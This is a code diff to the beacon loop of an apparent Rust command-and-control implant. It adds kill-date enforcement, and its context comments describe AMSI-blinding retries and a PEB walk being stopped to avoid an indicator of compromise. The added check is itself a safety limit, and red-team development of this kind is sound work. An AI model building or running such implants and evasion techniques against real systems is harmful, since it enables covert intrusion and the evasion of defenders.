@@ -185,6 +185,18 @@ pub unsafe fn beacon_loop() {
     let mut cycle: u32 = 0;
     let mut amsi_patched = false;
     loop {
+        // Kill-date enforcement (CRITICAL-18 from the 2026-07-21 audit).
+        // `implant.expires_at` is decoded from the config blob (0 = no expiry)
+        // but v0.3.0 never checked it. We now compare against the wall clock
+        // once per cycle and return cleanly on expiry (mirrors Command::Exit).
+        // now_unix()==0 means the clock couldn't be resolved — do NOT enforce
+        // in that case (would kill the beacon on a clock failure).
+        if implant.expires_at != 0 {
+            let now = crate::hostinfo::now_unix();
+            if now != 0 && now >= implant.expires_at {
+                return;
+            }
+        }
         // Retry AMSI blinding: capped at 10 cycles (amsi.dll demand-loads only
         // when a scanner starts). After cycle 10 or on success, stop the PEB
         // walk to eliminate the per-cycle IOC.
